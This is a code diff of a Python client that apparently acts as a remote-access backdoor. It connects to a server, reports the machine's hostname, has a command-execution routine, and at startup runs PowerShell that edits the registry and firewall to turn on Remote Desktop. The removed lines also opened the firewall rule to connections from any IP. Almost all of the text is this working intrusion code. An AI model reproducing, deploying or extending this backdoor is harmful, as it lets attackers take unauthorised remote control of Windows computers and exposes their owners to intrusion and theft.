@@ -30,7 +30,7 @@ def connect_to_server(server_ip, port=12345):
     try:
         client_socket.connect((server_ip, port))
         # Send hostname to server
-        hostname = getpass.getuser()  # You can use socket.gethostname() if you want the full machine name
+        hostname = socket.gethostname()
         client_socket.sendall(hostname.encode())
         return client_socket
     except (socket.timeout, socket.error) as e:
@@ -45,39 +45,19 @@ def execute_command(command):
         print(f"Command execution failed: {e}")
 
 def enable_rdp():
-    print("Enabling Remote Desktop and configuring firewall for any connections...")
-    rdp_script = """
-    # Enable Remote Desktop
-    $regPath = "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server"
-    $rdpEnabled = Get-ItemProperty -Path $regPath -Name "fDenyTSConnections" | Select-Object -ExpandProperty "fDenyTSConnections"
-    if ($rdpEnabled -eq 1) {
-        Set-ItemProperty -Path $regPath -Name "fDenyTSConnections" -Value 0
-        Write-Output "Remote Desktop enabled."
-    } else {
-        Write-Output "Remote Desktop is already enabled."
-    }
-
-    # Allow RDP through Windows Firewall
-    Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
-    Write-Output "RDP allowed through firewall."
-
-    # Allow connections from any IP by setting the scope to "Any"
-    $firewallRule = Get-NetFirewallRule -DisplayGroup "Remote Desktop"
-    if ($firewallRule) {
-        Set-NetFirewallRule -DisplayGroup "Remote Desktop" -RemoteAddress "Any"
-        Write-Output "Firewall rule updated to allow connections from any IP."
-    } else {
-        Write-Output "Firewall rule for Remote Desktop not found."
-    }
+    command = """
+    powershell -Command "
+    Set-ItemProperty -Path 'HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server' -Name 'fDenyTSConnections' -Value 0;
+    Enable-NetFirewallRule -DisplayGroup 'Remote Desktop';
+    "
     """
-    execute_command(f'powershell -Command "{rdp_script}"')
+    execute_command(command)
 
 def main():
     port = 12345
     client_socket = None
 
-    # Enable RDP on client start
-    enable_rdp()
+    enable_rdp()  # Ensure RDP is enabled
 
     while True:
         if client_socket is None:
